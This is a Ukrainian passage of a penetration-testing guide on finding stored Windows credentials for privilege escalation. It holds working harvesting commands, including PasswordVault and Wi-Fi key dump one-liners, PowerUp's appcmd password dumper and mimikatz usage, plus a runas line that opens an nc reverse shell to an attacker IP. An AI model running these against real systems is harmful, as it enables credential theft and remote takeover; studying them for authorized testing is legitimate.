Сам факт, що користувач `root` у WSL не надає прав адміністратора Windows. Якщо поточна ідентичність Windows може читати файлову систему дистрибутива, перевірте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли бути збережені облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` характерна для старіших інсталяцій WSL; у WSL 2 дистрибутив зазвичай зберігається на віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тому спочатку визначте фактичний дистрибутив і шлях до його сховища. Уникайте виведення вмісту історії команд під час автоматизованого збору даних.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Сприймайте `DefaultUserName` і `DefaultDomainName` як контекст облікового запису, а не облікові дані. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` — це знахідка з відкритим текстом у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому тексті неможливо прочитати, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про розкриття облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Диспетчер облікових даних / Windows Vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати, щоб **автоматично входити в облікові записи користувачів**. Спочатку може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і налаштувати браузери на автоматичний вхід, але це працює не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в облікові записи користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager і Windows Vault** та застосовувати надані облікові дані замість того, щоб користувачі щоразу вводили ім’я користувача й пароль.

Якщо програми не взаємодіють із Credential Manager, гадаю, вони не зможуть використовувати облікові дані для певного ресурсу. Тож якщо ваша програма хоче використовувати сховище, вона має якось **зв’язатися з диспетчером облікових даних і запросити облікові дані для цього ресурсу** зі сховища за замовчуванням.

Скористайтеся `cmdkey`, щоб перелічити збережені на комп’ютері облікові дані.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Потім можна використовувати `runas` з параметром `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі віддалений двійковий файл запускається через спільний ресурс SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданими обліковими даними.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому тексті в `PasswordVault` універсальної платформи Windows (UWP) (також доступному як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, а його вміст можна розшифрувати засобами системи без прав адміністратора чи `SeDebugPrivilege`.

Виконайте цю команду PowerShell у активному сеансі користувача, щоб миттєво вилучити й розшифрувати всі збережені імена користувачів і паролі у відкритому тексті:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**API захисту даних (DPAPI)** надає спосіб симетричного шифрування даних і використовується переважно в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, щоб істотно підвищити ентропію.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від секретів облікових даних користувача**. У випадках системного шифрування використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувачів, створені за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, що зберігається поруч із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежено, тому переглянути його вміст за допомогою команди `dir` у CMD неможливо, хоча це можна зробити через PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Можна використати **модуль mimikatz** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені майстер-паролем**, зазвичай розташовані в:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Ви можете використати **модуль mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато DPAPI** **masterkeys** із **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовують для **скриптів** і завдань автоматизації, щоб зручно зберігати зашифровані облікові дані. Їх захищено за допомогою **DPAPI**, а це зазвичай означає, що їх можна розшифрувати лише від імені того самого користувача й на тому самому комп’ютері, де їх було створено.

Експортований файл облікових даних може мати довільну назву або шлях із розширенням `.xml`. Якщо скрипт або інвентаризація файлів вказує на такий файл, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може зберігати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, який можна прочитати, — лише зачіпка; [у Windows `Export-Clixml` прив’язує зашифровані облікові дані до користувача й комп’ютера, які виконали експорт](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а відновлений обліковий запис окремо має мати належні права на потрібну службу. Спершу перевірте шляхи й ACL, не виводячи зашифровані або відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, у якому їх збережено, виконайте:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
і в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль **Mimikatz** `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля Mimikatz `sekurlsa::dpapi` можна **витягти багато головних ключів DPAPI** з пам’яті

**mRemoteNG використовує інше сховище підключень.** Перевірте читабельні XML-файли в `%APPDATA%\mRemoteNG` і папці Documents користувача, зокрема файли зі звичайними назвами, наприклад `config.xml`. Перш ніж вважати XML-файл джерелом облікових даних, визначте схему підключень і знайдіть зашифровані атрибути `Password`. Збережене значення — це не пароль DPAPI/RDCMan; можливість його відновлення залежить від параметрів шифрування файлу та від того, чи використовувався власний головний пароль. Під час широкого пошуку не виводьте зашифровані значення.

**Експортовані профілі Remote Desktop Plus** також можуть бути читабельними та зберігатися в каталогах користувача або спільній папці адміністрування. У застарілому експорті `profiles.xml` є записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля зачіпкою щодо облікових даних, але не виводьте його та не припускайте, що це відкритий текст: [постачальник зазначає](https://www.donkz.nl/), що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на якому його створили, або налаштований менш суворо. Перш ніж покладатися на цей файл, з’ясуйте його походження та умови відновлення.

### Sticky Notes

Користувачі часто застосовують програму StickyNotes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, тому його завжди варто шукати й перевіряти.

Користувачі іноді зберігають паролі та іншу інформацію в програмах для нотаток. Пакетна програма Sticky Notes від Microsoft зазвичай зберігає нотатки за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші програми можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати відсутність файлу SQLite доказом відсутності нотаток, визначте встановлену програму та формат сховища.

Якщо Sticky Notes використовує журналювання з випереджальним записом SQLite, окрема копія `plum.sqlite` може не містити нещодавно зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і додайте `plum.sqlite-shm`, якщо він доступний; індекс спільної пам’яті можна відновити, але WAL є частиною постійного стану бази даних. Див. [документацію WAL для SQLite](https://www.sqlite.org/wal.html). Нотатка з іменем облікового запису або паролем — лише зачіпка щодо облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для запису із зашифрованого менеджера паролів також потрібні фактичний ключ розшифрування та специфічна для програми інтерпретація, перш ніж він зможе підтвердити можливість входу з вищими привілеями.

### AppCmd.exe

**Зауважте: щоб відновити паролі з AppCmd.exe, потрібно мати права адміністратора й запустити його з рівнем цілісності High.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, налаштовано певні **облікові дані**, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe`.\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних у реєстрі інструментів підтримки

У деяких старих інсталяціях інструментів віддаленої підтримки в реєстрі за фіксованими ключами програм зберігаються назви значень, пов’язані з паролями. Наприклад, `SecurityPasswordAES` у TeamViewer позначала налаштований статичний пароль сеансу у версіях до 9, згідно з [поясненням постачальника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, чи доступні для читання дані значення, його формат і поточну поведінку автентифікації. Перехід від пароля для віддаленої підтримки до облікового запису Windows із вищими привілеями також потребує фактичного повторного використання пароля та наявності дозволу на цей обліковий запис. Не виводьте шифротекст і відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що спільна книга, доступна для читання, містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша керує редагуванням і не є функцією безпеки; сам по собі він не доводить, що вміст книги зашифровано. Перевіряйте лише дозволені й доречні файли та не виводьте можливі секрети під час широкого переліку. Доступний для читання шлях `.xlsx`, захищений аркуш або прихований стовпець самі по собі не доводять, що там є облікові дані чи що будь-який обліковий запис має вищі привілеї; окремо перевірте фактичні дані та поточні права облікового запису.

### Збережені патчі змін на CI-сервері

CI-сервер може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збірки. [У документації TeamCity](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` зазначено як сховище змін віддалених запусків; каталог даних можна налаштувати, тож він не обов’язково розташований у `ProgramData`. Доступний для читання патч може зберегти вилучені чи додані посилання на файл облікових даних, ключ шифрування або скрипт, який використовує обидва. Наприклад, для робочого процесу PowerShell `ConvertTo-SecureString -Key` потрібні і ключ AES, і зашифрований рядок; [Microsoft зазначає](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ передається окремо. Спершу перегляньте лише назви доступних патчів, а потім, маючи дозвіл, перевірте вміст доречних файлів, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення або посилання на ключ самі по собі не доводять наявності дійсних облікових даних чи доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Власна ротація пароля локального адміністратора

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані до сховища — у доступному для читання файлі `.env` або поруч із двійковим файлом засобу оновлення. Разом перевірте заплановане завдання засобу оновлення, обліковий запис, ACL конфігурації, слухач і дозволи сховища даних. Сховище даних, доступне лише через loopback, усе одно доступне локальному користувачеві з дійсними обліковими даними, але сама автентифікація не доводить наявності дозволу на читання потрібних записів. Якщо поруч із шифротекстом доступний початковий параметр шифрування або матеріал ключа, перевірте точний спосіб виведення ключа, перш ніж покладатися на шифрування. Схема, яка детерміновано виводить ключ AES із відкритого початкового параметра за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), не підходить для захисту такого пароля; у документації Go зазначено, що цей пакет непридатний для випадкових даних, важливих для безпеки. Перш ніж вважати будь-який відновлений пароль шляхом ескалації, переконайтеся, що він досі дійсний і належить обліковому запису з групи локальних адміністраторів. Заплановане завдання, шлях до `.env` чи зашифрований блок самі по собі не доводять жодної з цих умов. Не виводьте паролі й матеріал ключа під час звичайного переліку.

Для керованих паролів локальних адміністраторів використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Його сховище на основі каталогу чи Entra та засоби контролю доступу відрізняються від власного локального сховища даних; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища читати конкретний індекс.

### Архіви плагінів Java-сервера та повторне використання облікових даних

Деякі плагіни Java-серверів постачаються як JAR-архіви в каталозі сервера `plugins`. Доступний для читання власний плагін може містити конфігурацію або байткод із вбудованими обліковими даними служби. Перевіряйте архів лише за наявності дозволу й не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить, що він містить секрет, а відновлений пароль служби веде до вищих привілеїв лише за умови, що він також дійсний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на окремі секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle щодо JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire із вбудованою базою даних може зберігати `openfire.script` у каталозі `Openfire\embedded-db`. Якщо поточний обліковий запис може його читати, перевірте разом записи `OFUSER` і властивість `passwordKey`. У [документації Openfire щодо постачальника облікових даних](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому вигляді або шифруватися ключем, заданим у цій властивості. Відновлений пароль має значення для ескалації лише тоді, коли він досі дійсний для ідентифікатора з вищими привілеями; сама назва файлу не доводить ані наявності доступу для читання, ані повторного використання облікових даних. Шлях — лише підказка для інвентаризації, тому не виводьте вміст бази даних та облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може показати налаштовані порти й інтерфейс прив’язки адміністративної консолі, навіть якщо використовується зовнішня база даних. Зазвичай Openfire прив’язує адміністративну консоль до loopback; це все одно дає змогу локальному обліковому запису підключитися до адреси, якщо слухач запущений. Разом перевірте фактичний слухач, авторизовану роль адміністратора, політику завантаження плагінів і обліковий запис служби Openfire. Адміністратор, який може встановити плагін, може спричинити виконання його коду в контексті служби; це може дати високі привілеї, якщо служба працює від імені LocalSystem. Відповідний пароль облікового запису чи доступний для читання шлях до конфігурації самі по собі не доводять доступу до адміністративної консолі або виконання коду. Див. [посібник постачальника зі встановлення та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, які зазвичай мають назву `server.config.yaml`, можуть містити `CA.private_key` внутрішнього CA. Якщо користувач із нижчими привілеями може читати цей ключ, він може отримати змогу створити клієнтський сертифікат API. Чи призведе це до вищих привілеїв, залежить від ролей користувачів на сервері, доступності API та ідентифікатора, від імені якого працює сервер або цільовий агент. Клієнтська конфігурація містить інші дані; її виявлення не доводить доступу до CA сервера. У деяких розгортаннях приватний ключ CA зберігається офлайн, тож у доступній для читання конфігурації сервера може не бути ключа підпису.

На сервері Windows перевірте ACL **конфігурації сервера** в каталозі інсталяції та будь-яких захищених резервних копій. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо налаштовано інший шлях, використовуйте шлях служби. Переконайтеся, що поточний ідентифікатор може читати файл і що `CA.private_key` справді присутній. Не виводьте приватний ключ у журнали чи результат переліку. Робочий процес постачальника `config api_client` використовує ключ CA для видачі клієнтського сертифіката, але також потрібна відповідна роль на сервері; її створення або зміна може вимагати доступу на запис до сховища даних чи перезапуску. Наявний привілейований ідентифікатор сервера може забезпечити шлях навіть за відсутності таких дозволів на запис. API-запити з правами на виконання працюють у відповідному контексті сервера або агента, який може мати високі привілеї.

Захищайте конфігурацію сервера та резервні копії за допомогою обмежувальних ACL, за можливості зберігайте ключ підпису CA офлайн і обмежуйте ролі API та доступ до слухачів. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації щодо конфігурації безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — окремий менеджер сеансів. Його власне зашифроване сховище може розташовуватися за шляхом `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, тоді як експортна резервна копія сеансів може мати назву `sessions-backup.dat` і зберігатися в іншому місці. [Посібник SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначає, що експорти зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки між ними; [форум підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказує на власне сховище. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває його пароль і не доводить, що будь-які збережені облікові дані досі дійсні або мають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys у реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож варто перевірити, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо ви знайдете будь-який запис у цьому шляху, імовірно, це збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Докладніше про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена, а ви хочете, щоб вона автоматично запускалася під час завантаження системи, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, ця техніка більше не працює. Я спробував створити кілька SSH-ключів, додати їх за допомогою `ssh-add` і увійти через SSH на машину. Розділ реєстру HKCU\Software\OpenSSH\Agent\Keys відсутній, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматичного встановлення

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

You can also search for these files using **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Файли резервних копій Windows Imaging (`.wim`), доступні для читання, також можуть містити автономні кущі реєстру `SAM`, `SECURITY` і `SYSTEM`. Спершу перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **імена елементів** образу, перш ніж щось видобувати; сама назва файлу `.wim` не доводить наявності в ньому кущів реєстру, а звичайні образи `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. Спільний ресурс SMB — це окремий шлях доступу, який слід перевіряти лише тоді, коли цей ресурс входить до сфери перевірки. Див. рекомендації Microsoft щодо [образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідник файлів кущів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локального адміністратора на групі комп’ютерів за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні вади безпеки. По-перше, об’єкти групової політики (GPO), що зберігалися як XML-файли в SYSVOL, могли бути доступні будь-якому користувачеві домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із загальнодоступним ключем за замовчуванням, міг розшифрувати будь-який автентифікований користувач. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, які містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити й усунути цю вразливість безпеки.

Шукайте ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Конфігурація IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

